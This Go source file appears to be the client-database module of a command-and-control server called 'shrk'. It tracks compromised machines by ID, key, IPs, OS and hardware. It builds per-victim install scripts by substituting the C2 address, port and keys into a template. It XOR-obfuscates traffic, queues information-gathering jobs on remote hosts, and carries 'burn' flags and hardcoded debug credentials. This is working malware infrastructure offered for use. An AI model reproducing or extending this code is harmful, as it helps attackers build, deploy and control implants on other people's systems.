package database

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/ngn13/shrk/server/config"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/util"
)

var (
	CLIENT_ID_SIZE  int = 8
	CLIENT_KEY_SIZE int = 12

	CLIENT_DEBUG_ID  string = "DEBUGID0"
	CLIENT_DEBUG_KEY string = "DEBUGINGKEY0"
)

type Client struct {
	ID         string    `json:"id"`
	Key        string    `json:"key"`
	OS         string    `json:"os"`
	IPs        []string  `json:"ips"`
	Memory     uint64    `json:"memory"` // kb
	Cores      uint64    `json:"cores"`
	FirstCon   time.Time `json:"first_con"`
	LastCon    time.Time `json:"last_con"`
	HasInfo    bool      `json:"has_info"`
	Connected  bool      `json:"connected"`
	SourceURL  string    `json:"source_url"`
	ShouldBurn bool      `json:"should_burn"`
	IsBurned   bool      `json:"is_burned"`
}

func (c *Client) BuildScript(conf *config.Type) (string, error) {
	var (
		sf          *os.File
		scanner     *bufio.Scanner
		source_url  string
		script_line []byte
		script      []byte
		err         error
	)

	if source_url = c.SourceURL; source_url == "" {
		if source_url, err = url.JoinPath(conf.HTTP_URL, conf.SourcePath); err != nil {
			return "", err
		}
	}

	if sf, err = os.Open(conf.Script); err != nil {
		return "", err
	}
	defer sf.Close()

	scanner = bufio.NewScanner(sf)
	script = []byte{}

	for scanner.Scan() {
		// remove empty lines
		if script_line = scanner.Bytes(); script_line == nil || len(script_line) == 0 {
			continue
		}

		// remove comments
		if script_line[0] == byte('#') {
			continue
		}

		script = append(script, script_line...)
		script = append(script, byte('\n'))
	}

	if err = scanner.Err(); err != nil {
		return "", err
	}

	script = bytes.ReplaceAll(script, []byte("[SERVER_ADDR]"), []byte(conf.C2_URL_p.Hostname()))
	script = bytes.ReplaceAll(script, []byte("[SERVER_PORT]"), []byte(conf.C2_URL_p.Port()))
	script = bytes.ReplaceAll(script, []byte("[CLIENT_ID]"), []byte(c.ID))
	script = bytes.ReplaceAll(script, []byte("[CLIENT_KEY]"), []byte(c.Key))
	script = bytes.ReplaceAll(script, []byte("[SOURCE_URL]"), []byte(source_url))
	script = bytes.ReplaceAll(script, []byte("[VERSION]"), []byte(conf.Version))
	if conf.Debug {
		script = bytes.ReplaceAll(script, []byte("[DEBUG]"), []byte("1"))
	} else {
		script = bytes.ReplaceAll(script, []byte("[DEBUG]"), []byte("0"))
	}

	return string(script), err
}

func (c *Client) ScriptPath() string {
	return util.SHA1(c.ID)
}

func (c *Client) HumanMem() string {
	return util.HumanizeSize(c.Memory * 1024)
}

func (c *Client) IsActive() bool {
	if !c.Connected {
		return false
	}

	return time.Since(c.LastCon) <= 15*time.Second
}

func (c *Client) NewCon(con *net.UDPAddr) {
	var (
		ip    string = con.IP.String()
		found bool   = false
	)

	for _, i := range c.IPs {
		if found = i == ip; found {
			break
		}
	}

	if !found {
		c.IPs = append(c.IPs, ip)
	}

	if !c.Connected {
		c.FirstCon = time.Now()
	}

	c.Connected = true
	c.LastCon = time.Now()
}

func (c *Client) XOR(input []byte) error {
	input_len := len(input)

	for i := 0; i < input_len; i++ {
		input[i] ^= c.Key[i%CLIENT_KEY_SIZE]
	}

	return nil
}

func (c *Client) GetInfo(jobs *joblist.Type) error {
	var (
		res  *util.Buffer
		data *util.Buffer

		job *joblist.Job
		err error
	)

	data = util.NewBuffer("-")
	res = util.NewBuffer()

	if job, err = jobs.Add(c.ID, joblist.CMD_INFO, data, res); err != nil {
		return err
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		return fmt.Errorf("job timeout")
	}

	info := res.String()
	info_list := strings.Split(info, "/")

	mem := util.ListNext(info_list, 0)  // memory
	cpu := util.ListNext(info_list, 1)  // CPU
	os := util.ListNext(info_list, 2)   // OS
	dist := util.ListNext(info_list, 3) // distro

	// check if we failed to get the data
	if mem == "" {
		return fmt.Errorf("job failed: %s", info)
	}

	// first we have the memory in kbs
	if c.Memory, err = strconv.ParseUint(mem, 10, 64); err != nil {
		return fmt.Errorf("failed to parse the memory size from info job result")
	}

	// the CPU core count
	if c.Cores, err = strconv.ParseUint(cpu, 10, 64); err != nil {
		return fmt.Errorf("failed to parse the cpu cores from info job result")
	}

	// next we have the kernel info, and the distro info (if any)
	if dist == "" {
		c.OS = os
	} else {
		c.OS = fmt.Sprintf("%s (%s)", dist, os)
	}

	c.HasInfo = true
	return nil
}
